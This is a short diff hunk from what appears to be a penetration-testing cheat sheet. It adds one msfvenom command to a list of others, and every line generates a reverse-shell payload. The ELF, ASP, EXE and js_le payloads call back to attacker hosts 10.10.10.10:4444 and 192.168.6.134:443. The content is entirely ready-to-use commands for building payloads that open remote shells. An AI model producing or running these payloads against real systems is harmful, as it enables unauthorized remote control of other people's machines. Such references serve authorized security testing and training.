@@ -11,6 +11,7 @@ msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o r
 
 # Create an staged Framework payload
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp -o reverse_shell.asp
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.6.134 LPORT=443 -f js_le
 
 # Create a non staged Windows binary payload
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
